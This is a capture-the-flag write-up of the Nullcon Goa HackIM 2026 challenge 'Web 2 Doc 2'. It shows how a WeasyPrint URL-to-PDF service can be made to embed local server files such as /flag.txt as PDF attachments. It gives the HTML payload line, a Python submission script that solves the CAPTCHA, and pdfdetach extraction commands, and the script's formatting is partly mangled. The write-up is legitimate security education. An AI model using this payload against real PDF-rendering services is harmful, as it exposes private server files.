---
title: "Web 2 Doc 2 - Nullcon Goa HackIM 2026 CTF"
category: "web"
type: "writeup"
tags: ["web", "doc", "nullcon-goa-hackim-2026-ctf", "2026", "ctf-writeup"]
summary: "Event: Nullcon Goa HackIM 2026 CTF"
source:
  name: "CTFtime writeup #40636"
  url: "https://ctftime.org/writeup/40636"
original_source: "https://github.com/RootRunners/Nullcon-Goa-HackIM-2026-CTF-RootRunners-Official-Write-ups/blob/main/Web/Web_2_Doc_2/README.md"
ctf:
  name: "Nullcon Goa HackIM 2026 CTF"
  year: 2026
  challenge: "Web 2 Doc 2"
---

## Metadata

- **CTF:** Nullcon Goa HackIM 2026 CTF
- **Task:** Web 2 Doc 2
- **Author team:** RootRunners
- **CTFtime tags:** web
- **CTFtime:** <https://ctftime.org/writeup/40636>
- **Original writeup:** <https://github.com/RootRunners/Nullcon-Goa-HackIM-2026-CTF-RootRunners-Official-Write-ups/blob/main/Web/Web_2_Doc_2/README.md>

---
# Web 2 Doc 2

**Event:** Nullcon Goa HackIM 2026 CTF   
**Category:** Web   
**Points:** 335   
**Service:** `52.59.124.14:5003`

## Overview  
This is the Web 2 Doc v1 service without `/admin/flag`. The app still converts a user-supplied URL to PDF using WeasyPrint. WeasyPrint supports `<link rel="attachment">`, which can embed local files as PDF attachments. By hosting an HTML page that references `file:///flag.txt` as an attachment, the generated PDF contains the flag as an embedded file.

## Vulnerability  
\- The URL fetcher allows user-controlled HTML content.  
\- WeasyPrint processes `<link rel="attachment" href="file://...">` without restriction.  
\- `file://` access is not blocked, so local files can be embedded in the PDF.

## Exploit Steps  
1\. Host a malicious HTML page containing:  
```html  
<link rel="attachment" href="file:///flag.txt">  
```  
2\. Solve the CAPTCHA and request conversion for that URL.  
3\. Extract the embedded attachment from the returned PDF.

## Minimal Exploit (Python)  
```python  
#!/usr/bin/env python3  
import requests  
import re  
import sys

URL = "http://52.59.124.14:5003"

s = requests.Session()

def get_captcha():  
r = s.get(URL)  
m = re.search(r'<div class="captcha-display">([A-Za-z0-9]+)</div>', r.text)  
return m.group(1) if m else None

def convert(target_url):  
captcha = get_captcha()  
if not captcha:  
raise RuntimeError("captcha not found")  
data = {"url": target_url, "captcha_answer": captcha}  
r = [s.post](http://s.post)(f"{URL}/convert", data=data, timeout=30)  
r.raise_for_status()  
return r.content

if __name__ == "__main__":  
target = sys.argv[1] if len(sys.argv) > 1 else "https://YOUR_HOST/exploit.html"  
pdf = convert(target)  
with open("output.pdf", "wb") as f:  
f.write(pdf)  
print("saved output.pdf")  
```

## Extract Attachment  
```bash  
pdfdetach -list output.pdf  
pdfdetach -save 1 -o flag.txt output.pdf  
cat flag.txt  
```

## Flag  
`ENO{weasy_pr1nt_can_h4v3_f1l3s_1n_PDF_att4chments!}`
